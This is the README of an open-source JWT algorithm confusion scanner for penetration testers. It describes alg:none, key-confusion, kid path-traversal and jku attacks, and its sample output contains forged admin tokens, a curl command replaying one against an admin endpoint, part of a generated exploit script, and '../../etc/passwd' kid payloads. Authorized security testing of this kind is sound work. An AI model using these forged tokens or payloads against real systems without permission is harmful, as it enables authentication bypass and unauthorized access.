# JWT Algorithm Confusion Scanner

A specialized security tool for detecting JWT algorithm confusion vulnerabilities in web applications, allowing penetration testers to identify improper token validation techniques that can lead to authentication bypasses. **Features advanced verification and baseline comparison methods to minimize false positives.**

## Overview

JSON Web Tokens (JWTs) are commonly used for authentication and session management. When improperly implemented, they can be vulnerable to various attacks, particularly "algorithm confusion" where attackers manipulate the algorithm field to bypass signature verification.

This tool systematically tests targets for multiple JWT attack vectors:

- "alg:none" attacks (acceptance of unsigned tokens)  
- Algorithm switching without re-validation
- Key confusion attacks (RS256 → HS256 with public key)
- KID/JKU header parameter manipulation
- Payload tampering with signature bypass

## Installation

```bash
# Clone the repository
git clone https://github.com/geeknik/jwt-scanner.git
cd jwt-scanner

# Install dependencies
pip install -r requirements.txt
```

### Requirements

- Python 3.6+
- requests
- colorama
- urllib3

## Usage

Basic usage:

```bash
python jwt_scanner.py https://target.com
```

The scanner will attempt to extract JWT tokens from the response. If unsuccessful, you can provide the token manually:

```bash
python jwt_scanner.py https://target.com -t "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Advanced Usage with Verification

To reduce false positives, use the verification options:

```bash
python jwt_scanner.py https://target.com -t "eyJhbG..." --verify-endpoint "https://target.com/admin/dashboard" --success-strings "Welcome,admin panel" --failure-strings "unauthorized,login required"
```

This tells the scanner to:

1. Test the main URL for initial vulnerabilities
2. Verify successful exploitation by testing the vulnerable token against the `/admin/dashboard` endpoint
3. Look for specific strings that indicate success or failure

## Proof of Concept Generation

When the scanner identifies a vulnerability, it automatically generates proof of concept exploits:

1. **Token comparison** - Shows the original vs. forged token details
2. **Evidence** - Provides concrete differences between responses with legitimate vs. forged tokens
3. **Curl command** - Ready-to-use command to verify the vulnerability
4. **Python script** - Complete exploitation script for verification and demonstration

Example output:

```
[+] PROOF OF CONCEPT EXPLOITS GENERATED:

[+] POC #1: payload-manipulation - Added 'isAdmin:true' with alg:none attack

[*] Token Comparison:
[*] Original Token Header:
{
  "alg": "RS256",
  "typ": "JWT"
}
[*] Original Token Payload:
{
  "id": "client_2oABS7jzy1HEhgPl3AMSBV18sb4",
  "rotating_token": "yrfv5y6zys4oo3eflnmm0h0i3cevpx4id3rk2ydd"
}
[*] Attack Token Header:
{
  "alg": "none",
  "typ": "JWT"
}
[*] Attack Token Payload:
{
  "id": "client_2oABS7jzy1HEhgPl3AMSBV18sb4",
  "rotating_token": "yrfv5y6zys4oo3eflnmm0h0i3cevpx4id3rk2ydd",
  "isAdmin": true
}

[*] Evidence of successful exploitation:
    Endpoint: https://target.com/api/v1/admin
    Original Response: Status 403, Length 157
    Attack Response: Status 200, Length 1452
    Differences detected in: Status codes, Content length, Response content

    Original content sample:
    {"error":"Unauthorized","message":"You do not have permission to access this resource"}

    Attack content sample:
    {"users":[{"id":"user_1","name":"Admin User","role":"admin"},{"id":"user_2","name":"Regular User","role":"user"}]}

[+] Verify with curl:
    curl -s -k -X GET "https://target.com/api/v1/admin" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6ImNsaWVudF8yb0FCUzdqenkxSEVoZ1BsM0FNU0JWMThzYjQiLCJyb3RhdGluZ190b2tlbiI6InlyZnY1eTZ6eXM0b28zZWZsbm1tMGgwaTNjZXZweDRpZDNyazJ5ZGQiLCJpc0FkbWluIjp0cnVlfQ." -i

[+] Python POC Script:
    Save the following to exploit-1.py and run with python3:
    #!/usr/bin/env python3
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    import json
    
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    
    # Target information
    target_url = "https://target.com/api/v1/admin"
    attack_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6ImNsaWVudF8yb0FCUzdqenkxSEVoZ1BsM0FNU0JWMThzYjQiLCJyb3RhdGluZ190b2tlbiI6InlyZnY1eTZ6eXM0b28zZWZsbm1tMGgwaTNjZXZweDRpZDNyazJ5ZGQiLCJpc0FkbWluIjp0cnVlfQ."
    ... (20 more lines)
```

### Options

```
usage: jwt_scanner.py [-h] [-t TOKEN] [-c COOKIE] [-a] [-k PUBLIC_KEY] [-p PAYLOAD] [-v] [-d DELAY] [--verify-endpoint ENDPOINT] [--success-strings STRINGS] [--failure-strings STRINGS] [--output FILE] [--verify-all] url

JWT Algorithm Confusion Scanner

positional arguments:
  url                   Target URL to test

optional arguments:
  -h, --help            show this help message and exit
  -t, --token TOKEN     JWT token to test
  -c, --cookie COOKIE   Name of the cookie containing the JWT
  -a, --auth-header     Use Authorization header
  -k, --public-key      Path to public key file
  -p, --payload         Path to custom payload JSON file
  -v, --verbose         Enable verbose output
  -d, --delay DELAY     Delay between requests (seconds)
  --verify-endpoint     Secondary URL to verify successful exploitation
  --success-strings     Comma-separated list of strings indicating successful exploitation
  --failure-strings     Comma-separated list of strings indicating failed exploitation
  --output              Output file for scan results (JSON format)
  --verify-all          Attempt to verify all potential vulnerabilities
```

## Features

1. **Automatic token extraction** - Detects JWTs in cookies or authorization headers
2. **Multiple attack vectors** - Tests common JWT flaws in a single run
3. **Smart response analysis** - Uses baseline comparisons and confidence scoring to reduce false positives
4. **Public key exploitation** - Tests for signature bypasses using public key confusion
5. **Custom payload support** - Test with your own JWT manipulation techniques
6. **Verification capabilities** - Confirms vulnerabilities using secondary endpoints and detailed response analysis
7. **Confidence scoring** - Provides a confidence score for each potential vulnerability based on multiple indicators
8. **Proof of Concept generation** - Automatically creates ready-to-use exploit scripts for verified vulnerabilities

## Attack Techniques

### Algorithm None Attack

Tests if the server accepts tokens with the `alg` value set to `none`, which eliminates signature verification.

### Key Confusion

Tests if the server is vulnerable to using the wrong key type for validation. For example, when a token signed with RSA is switched to HMAC and validated using the public key as the HMAC secret.

### Algorithm Substitution

Tests if the server accepts tokens where the algorithm has been changed without re-validating the signature.

### KID Manipulation

Tests if the Key ID (`kid`) parameter can be manipulated to point to files on the server's filesystem or to exploit path traversal vulnerabilities.

### JKU Manipulation

Tests if the JWK Set URL (`jku`) parameter can be manipulated to point to an attacker-controlled location for key retrieval.

### Payload Manipulation

Tests if various privilege escalation payload modifications can be successful when combined with other attacks.

## Understanding Results and Avoiding False Positives

The scanner uses a sophisticated system to determine if a target is vulnerable to JWT attacks. However, it's important to understand how to interpret the results:

### Confidence Scores

Results include a confidence score (0-100%) that indicates how likely a vulnerability is real:

- **HIGH (70-100%)**: Strong evidence of vulnerability, especially if authentication verification is also high
- **MEDIUM (50-69%)**: Potential vulnerability that requires manual verification
- **LOW (0-49%)**: Likely not vulnerable or insufficient evidence

### Authentication Verification

The scanner now includes authentication verification that tests if JWT tokens actually affect access to resources:

- **High auth confidence (>0.5)**: Token appears to control access to protected resources
- **Low auth confidence (<0.1)**: Site may be ignoring JWT tokens entirely

### Warning Signs of False Positives

Be cautious of potential false positives when you see these warnings:

1. "Valid and invalid baseline responses are very similar" - Site may be ignoring tokens entirely
2. "Response very similar to previous attacks" - Different attack types shouldn't produce identical responses
3. "Token does not appear to affect access to resources" - Real JWT authentication should show differences

### Contextual Success Indicators

The scanner now uses contextual analysis for success indicators, only counting words like "success" or "profile" when they appear in authentication-related contexts, not just anywhere on the page.

### Verifying Results

For the most accurate results:

1. Always use the `--verify-endpoint` option with a protected resource
2. Provide custom `--success-strings` and `--failure-strings` specific to your target
3. Manually verify any "POTENTIAL VULNERABILITY" findings
4. Check the evidence in POC reports for clear differences between original and attack responses

## Example Output

```
[+] Starting JWT Algorithm Confusion Scanner
[*] Target URL: https://vulnerable-site.com
[+] Found JWT in cookie: session
[+] Successfully decoded JWT token

[*] Establishing baseline responses...
[*] Getting baseline for valid token...
[*] Getting baseline for invalid token...
[+] Baselines established:
    Valid token: Status 200, Content Length: 8453
    Invalid token: Status 401, Content Length: 1256

[*] Testing for 'none' algorithm vulnerability...
[*] Trying alg-none: Algorithm set to 'none' with empty signature
[*] Verifying if token affects authentication...
[*] Authentication verification confidence: 0.83
[+] Token appears to affect access to resources
[*] Evaluating response...
[*] Response similarity - Valid: 0.85, Invalid: 0.25
[+] Response is significantly more similar to valid token response
[*] Adjusted confidence: 75% (auth factor: 1.00)
[*] Verifying with secondary endpoint: https://vulnerable-site.com/admin/dashboard
[*] Confidence: 92% (HIGH)
[+] VERIFIED vulnerability found! Attack: alg-none
[+] Vulnerable token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.

[*] Testing for key confusion vulnerability...
[*] Trying key-confusion: Switched from RS256 to HS256 using public key as HMAC secret
[*] Verifying if token affects authentication...
[*] Authentication verification confidence: 0.67
[+] Token appears to affect access to resources
[*] Evaluating response...
[*] Response similarity - Valid: 0.65, Invalid: 0.40
[+] Response is somewhat similar to valid token response
[*] Adjusted confidence: 45% (auth factor: 1.00)
[+] POTENTIAL vulnerability found! Attack: key-confusion
[+] Potentially vulnerable token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.a77Bn8Vxe7YRzOZ9Ao0j4J4pRwIwNql7Z5x98QPXIoc
[!] Manual verification recommended

...

[!] Target is CONFIRMED VULNERABLE to JWT algorithm confusion attacks!
[!] Found 1 verified vulnerabilities:
  1. alg-none: Algorithm set to 'none' with empty signature (Confidence: 92%)
[!] Found 2 potential vulnerabilities requiring manual verification:
  1. key-confusion: Switched from RS256 to HS256 using public key as HMAC secret (Confidence: 45%)
  2. kid-manipulation: Changed 'kid' parameter to: '../../../../../../../etc/passwd' (Confidence: 38%)
```

## Creating Custom Payloads

You can create a JSON file with custom payloads to test:

```json
[
  {
    "header": {
      "alg": "HS256",
      "typ": "JWT", 
      "kid": "../../etc/passwd"
    },
    "payload": {
      "sub": "1234567890",
      "name": "John Doe",
      "admin": true
    },
    "key": "your-test-key"
  }
]
```

## Security Considerations

This tool is designed for security professionals with proper authorization to test applications. Unauthorized testing may violate laws and terms of service. Always:

1. Obtain written permission before testing
2. Respect rate limits and implement appropriate delays
3. Report findings responsibly to the affected organizations

## Reducing False Positives

The scanner uses several advanced techniques to minimize false positives:

1. **Baseline Comparison**: Establishes how the application responds to valid and invalid tokens for comparison, with detection of sites that ignore tokens entirely
2. **Authentication Verification**: Tests if tokens actually affect access to protected resources by comparing responses with and without tokens
3. **Contextual Success Indicators**: Only counts success indicators when they appear in authentication-related contexts, not just anywhere on the page
4. **Cross-Attack Response Comparison**: Detects when different attack types produce very similar responses, suggesting the site ignores tokens
5. **Confidence Scoring**: Calculates a confidence percentage based on multiple indicators, with adjustments based on authentication verification
6. **Secondary Verification**: Tests verified tokens against additional endpoints to confirm exploitation
7. **Response Analysis**: Examines response content, headers, and status codes for both positive and negative indicators
8. **Custom Success/Failure Indicators**: Allows specifying application-specific strings that indicate successful/failed exploitation

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request
